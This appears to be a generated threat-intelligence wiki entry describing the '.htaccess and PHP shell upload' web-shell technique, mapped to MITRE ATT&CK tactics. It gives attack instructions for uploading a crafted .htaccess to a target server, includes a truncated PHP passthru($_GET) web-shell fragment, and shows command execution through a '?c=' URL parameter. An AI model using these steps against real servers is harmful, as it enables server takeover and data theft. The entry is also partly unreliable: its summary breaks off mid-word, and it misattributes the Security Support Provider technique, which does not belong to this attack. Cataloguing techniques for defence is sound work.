---
id: b9db95ac-d076-47ba-aa98-55113689b145
name: HTAccess and PHP Shell Upload
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:40.849571+00:00'
updated_at: '2023-04-06T20:44:27.012024+00:00'
tactics:
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Security Support Provider|T1101 - Security Support Provider]]'
- '[[Web Shell|T1100 - Web Shell]]'
tags:
- '[[.htaccess upload]]'
---

# HTAccess and PHP Shell Upload

## Summary

The HTAccess and PHP Shell Upload procedure is a common attack method used by threat actors to gain access to web servers. Attackers can upload a malicious .htaccess file, which allows them to execute arbitrary commands on the server. This technique is often used to maintain persistence and evade d

## Description

# Description

The HTAccess and PHP Shell Upload procedure is a common attack method used by threat actors to gain access to web servers. Attackers can upload a malicious .htaccess file, which allows them to execute arbitrary commands on the server. This technique is often used to maintain persistence and evade detection. Once the attacker has gained access, they can execute PHP shell commands to further exploit the system.

From a technical standpoint, the attacker first needs to find a vulnerable web server that allows .htaccess file uploads. Once they have identified a target, they can upload a malicious .htaccess file that contains code to execute arbitrary commands. After gaining access, the attacker can use PHP shell commands to further exploit the system and maintain persistence.

The business value of this attack is significant as it can lead to the complete compromise of a web server, resulting in the theft of sensitive data, disruption of service, and reputational damage.

## Requirements

1. Access to a vulnerable web server that allows .htaccess file uploads

1. Ability to execute PHP shell commands

## Defense

1. Regularly scan web servers for vulnerabilities and apply patches as needed

1. Disable .htaccess file uploads if not needed

1. Monitor server logs for suspicious activity

## Objectives

1. Gain access to the target web server

1. Execute arbitrary commands on the server

1. Maintain persistence on the server

# Instructions

1. To execute this attack, create a file named '.htaccess' and include the following code. Then upload the file to the target server:

It is important to note that the .htaccess file must be uploaded to the same directory and sub-directories where the attack is intended to be executed.

**Code**: [[# Self contained .htaccess web shell - Part of the]]

> This attack exploits a vulnerability in Apache web servers where the '.htaccess' file can be used to execute arbitrary code on the server. By uploading a specially crafted '.htaccess' file, attackers can trick the web server into interpreting the file as a PHP script and executing any code contained within it. This can be used to take control of the server, steal sensitive data, or carry out further attacks.

2. To execute a shell command using this PHP script, append the command you want to execute to the URL query parameter 'c'.

**Code**: [[###### SHELL ######
<?php echo "\n";passthru($_GET]]

> This PHP script allows you to execute shell commands on the server through a web interface. The 'passthru' function is used to execute the command and the '2>&1' redirects any error messages to the standard output. Be careful when using this script as it can potentially give an attacker full access to the server if not properly secured.

3. Execute a command by appending to the end of the URL.

**Code**: [[https://domain/?c=ls]]

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Security Support Provider|T1101 - Security Support Provider]]
- [[Web Shell|T1100 - Web Shell]]

## Tags

- [[.htaccess upload]]
